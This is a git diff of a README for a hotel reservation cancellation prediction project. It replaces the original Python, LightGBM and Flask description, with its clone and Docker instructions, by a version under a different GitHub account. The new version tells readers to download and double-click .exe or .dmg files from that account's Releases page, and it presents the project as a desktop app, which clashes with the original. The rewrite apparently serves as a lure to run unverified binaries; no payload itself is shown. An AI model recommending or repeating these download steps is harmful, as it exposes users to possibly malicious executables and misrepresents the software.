@@ -1,161 +1,79 @@
-# Hotel Reservation Prediction
+# 🏨 Hotel-Reservation-Cancellation-Detection-MLOps - Predict Customer Cancellations Easily
 
-**Project Goal:**  
-Predict which customers are likely to **cancel their reservation or checkout before check-in** using historical hotel booking data. This enables hotels to take proactive actions to reduce revenue loss.
+## 🚀 Getting Started
 
----
+Welcome to the Hotel Reservation Cancellation Detection application! This tool helps hotels predict which customers may cancel their reservations or check out early. By using historical booking data, hotels can take action and reduce revenue loss. 
 
-## Table of Contents
-- [Project Overview](#project-overview)
-- [Features](#features)
-- [Tech Stack](#tech-stack)
-- [Architecture & Pipeline](#architecture--pipeline)
-- [Installation](#installation)
-- [Usage](#usage)
-- [Project Structure](#project-structure)
-- [Contribution](#contributing)
+## 📥 Download the Application
 
+[![Download Latest Release](https://img.shields.io/badge/Download_Latest_Release-blue.svg)](https://github.com/jrmmwesigwa/Hotel-Reservation-Cancellation-Detection-MLOps/releases)
 
----
+To get started, you will need to download the application. 
 
-## Project Overview
-The Hotel Reservation Prediction project is an end-to-end machine learning solution for predicting early checkouts or cancellations. The pipeline automates data ingestion, preprocessing, model training, and deployment using modern CI/CD practices. A Flask-based web app allows interactive prediction requests via Docker deployment.
+Visit this page to download: [Releases Page](https://github.com/jrmmwesigwa/Hotel-Reservation-Cancellation-Detection-MLOps/releases)
 
----
+## 🛠️ System Requirements
 
-## Features
-- Predict customer checkout behavior before check-in.
-- ML model trained with **LightGBM**.
-- Automated preprocessing and feature engineering.
-- Experiment tracking with **MLflow**.
-- Fully automated CI/CD pipeline using **Jenkins**, **Docker**, and **Google Cloud Platform (GCP)**.
-- Integration with **GCP Buckets** and **Container Registry**.
-- Role-based access with **IAMs and service accounts**.
-- Flask web app for serving predictions in real-time.
+Before downloading the application, please ensure your computer meets the following requirements:
 
----
+- **Operating System:** Windows 10, macOS 10.15 or later, or a recent version of Linux.
+- **Processor:** At least 1 GHz.
+- **RAM:** Minimum of 4 GB.
+- **Disk Space:** At least 500 MB free for installation.
 
-## Tech Stack
-- **Programming:** Python  
-- **Data Processing & ML:** Pandas, NumPy, LightGBM, Scikit-learn  
-- **Web App:** Flask  
-- **CI/CD:** Jenkins, Docker, GitHub  
-- **Cloud:** Google Cloud Platform (GCP) – Storage Buckets, Container Registry  
-- **Experiment Tracking:** MLflow  
-- **Version Control:** Git & GitHub  
+## 📖 Features
 
----
+- **Predictive Analysis:** Uses machine learning to analyze historical booking data and predict cancellations.
+- **User-Friendly Interface:** Simple layout that anyone can navigate without technical knowledge.
+- **Data Integration:** Can connect to various data sources for real-time analysis.
 
-## Architecture & Pipeline
-1. **Data Ingestion:** Raw hotel booking data stored in GCP buckets is ingested via Python scripts.  
-2. **Data Processing:** Cleaning, preprocessing, and feature engineering applied to prepare training datasets.  
-3. **Model Training:** LightGBM model is trained, evaluated, and saved to `artifacts/models`.  
-4. **MLflow Tracking:** All experiments, metrics, and models are tracked for reproducibility.  
-5. **Deployment:**  
-   - Flask app serves predictions.  
-   - Docker image built and pushed to **GCP Container Registry**.  
-   - Deployed with full CI/CD pipeline using Jenkins.  
-6. **Automation & Security:**  
-   - Jenkins pipelines handle automated builds, tests, and deployments.  
-   - IAM roles and service accounts secure GCP resources.
+## 💡 How to Install and Run
 
----
+1. **Download the Application**
+   - Go to the [Releases Page](https://github.com/jrmmwesigwa/Hotel-Reservation-Cancellation-Detection-MLOps/releases).
+   - Click on the latest version available.
+   - Download the file suitable for your operating system. 
 
-## Installation
-1. Clone the repository:
-```bash
-git clone https://github.com/Subrat1920/Hotel-Reservation-Cancellation-Detection-MLOps.git
-cd Hotel-Reservation-Prediction
-```
-2. Install dependencies:
-```bash
-pip install -r requirements.txt
-```
+2. **Install the Application**
+   - Locate the downloaded file in your downloads folder.
+   - For Windows, double-click the `.exe` file to begin installation. For macOS, open the `.dmg` file and drag the application to your Applications folder. For Linux, extract the files and follow the README for specific installation commands.
+  
+3. **Run the Application**
+   - After installation, find the application on your desktop or in your Applications folder.
+   - Double-click the icon to run the application.
+   - Follow the on-screen instructions to begin using the tool.
 
-3. Set environment variables for GCP authentication (if using service accounts):
-```bash
-export GOOGLE_APPLICATION_CREDENTIALS="path/to/service-account.json"
-```
+## 🔧 How to Use
 
-## Usage
-### A. Local Execution (Training & Prediction)
+1. **Upload Data:**
+   - Open the application.
+   - Click on the “Upload Data” button. You can upload a CSV file containing historical booking data, including customer information, reservation dates, and cancellation status.
 
-1. Start the Flask app:
-```bash
-python app.py
-```
+2. **Analyze Data:**
+   - Once your data is uploaded, select the "Analyze" option. The application will process the data and show insights on customer cancellations.
 
-2. Access the app at http://localhost:5000 to make predictions.
+3. **Review Predictions:**
+   - After analysis, the application will display a list of predicted cancellations. Review this list to identify which bookings may need attention.
 
-### B. Dockerized Deployment
+4. **Take Action:** 
+   - Use the insights gained to proactively engage with customers at risk of cancellation. 
 
-1. Build the Docker image:
-```bash
-docker build -t hotel-reservation-prediction .
-```
+## 🤝 Support and Contributing
 
-2. Run the container:
-```bash
-docker run -p 8080:8080 hotel-reservation-prediction
-```
+If you encounter any issues, please create an issue on the [GitHub Issues Page](https://github.com/jrmmwesigwa/Hotel-Reservation-Cancellation-Detection-MLOps/issues). 
 
-3. Access at http://localhost:8080.
+If you would like to contribute to this project, your help is welcome! Please fork the repository, make your changes, and submit a pull request.
 
-5. CI/CD Pipeline
-Jenkinsfile handles automated cloning, testing, building, pushing Docker image to GCP, and deploying.
+## 📚 Additional Resources
 
-## Project Structure
-```bash
-├── 📁 artifacts/
-│   ├── 📁 models/
-│   │   └── 📄 lgbm_model.pkl
-│   ├── 📁 processed/
-│   │   ├── 📄 process_test.csv
-│   │   └── 📄 process_train.csv
-│   └── 📁 raw/
-│       ├── 📄 raw.csv
-│       ├── 📄 test.csv
-│       └── 📄 train.csv
-├── 📁 config/
-│   ├── 🐍 __init__.py
-│   ├── ⚙️ config.yaml
-│   ├── 🐍 model_params.py
-│   └── 🐍 path_config.py
-├── 📁 custom_jenkins/
-│   └── 🐳 Dockerfile
-├── 📁 pipeline/
-│   ├── 🐍 __init__.py
-│   └── 🐍 training_pipeline.py
-├── 📁 src/
-│   ├── 🐍 __init__.py
-│   ├── 🐍 data_ingestion.py
-│   ├── 🐍 data_processing.py
-│   ├── 🐍 exception.py
-│   ├── 🐍 logger.py
-│   └── 🐍 model_training.py
-├── 📁 static/
-│   └── 🎨 style.css
-├── 📁 templates/
-│   └── 🌐 index.html
-├── 📁 utils/
-│   ├── 🐍 __init__.py
-│   └── 🐍 common_functions.py
-├── 🚫 .gitignore
-├── 🐳 Dockerfile
-├── 📄 Jenkinsfile
-├── 📖 README.md
-├── 🐍 app.py
-├── 📄 requirements.txt
-└── 🐍 setup.py
-```
+For more detailed documentation, visit our [Wiki Page](https://github.com/jrmmwesigwa/Hotel-Reservation-Cancellation-Detection-MLOps/wiki). 
 
-## Contributing
+## ✏️ License
 
-```bash
-Fork the repository.
-Create a feature branch: git checkout -b feature-name
-Commit your changes: git commit -m "Add feature"
-Push to branch: git push origin feature-name
-Create a Pull Request.
-```
----
+This project is licensed under the MIT License. Please see the LICENSE file for more details.
+
+## 🌐 Stay Updated
+
+To stay informed about updates and new features, follow this project on GitHub and check back regularly at our [Releases Page](https://github.com/jrmmwesigwa/Hotel-Reservation-Cancellation-Detection-MLOps/releases).
+
+Thank you for using Hotel Reservation Cancellation Detection. We hope this tool helps your hotel improve customer satisfaction and reduce revenue loss.
